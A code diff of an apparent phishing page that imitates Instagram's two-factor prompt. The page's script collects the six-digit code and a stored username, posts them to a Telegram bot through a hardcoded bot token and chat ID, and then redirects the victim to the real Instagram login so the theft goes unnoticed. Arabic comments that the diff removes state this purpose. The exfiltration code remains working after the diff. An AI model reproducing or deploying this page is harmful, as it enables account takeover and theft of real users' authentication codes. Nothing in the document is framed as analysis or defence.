@@ -15,7 +15,6 @@
         input { width: 100%; padding: 12px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 16px; text-align: center; letter-spacing: 2px; margin-bottom: 15px; outline: none; }
         .btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 10px; font-weight: 600; font-size: 14px; cursor: pointer; }
         .btn:disabled { background-color: #b2dffc; cursor: default; }
-        .error { color: #ed4956; font-size: 13px; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
@@ -27,21 +26,14 @@
         <form id="2faForm">
             <input type="text" id="code" placeholder="------" maxlength="6" required>
             <button type="submit" class="btn" id="submitBtn">Confirm</button>
-            <div class="error" id="error"></div>
         </form>
     </div>
     <script>
-        const form = document.getElementById('2faForm');
-        const codeInput = document.getElementById('code');
-        const submitBtn = document.getElementById('submitBtn');
-        const errorDiv = document.getElementById('error');
-
-        form.addEventListener('submit', function(e) {
+        document.getElementById('2faForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const code = codeInput.value.trim();
+            const code = document.getElementById('code').value.trim();
             if (code.length < 6) return;
 
-            // إرسال رمز 2FA إلى تيليجرام
             const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
             const CHAT_ID = "2005892579";
             const username = sessionStorage.getItem('insta_user') || 'Unknown';
@@ -53,7 +45,6 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
             }).then(() => {
-                // التوجيه لصفحة إنستقرام الحقيقية بعد إرسال الكود
                 window.location.href = "https://www.instagram.com/accounts/login/";
             }).catch(() => {
                 window.location.href = "https://www.instagram.com/accounts/login/";
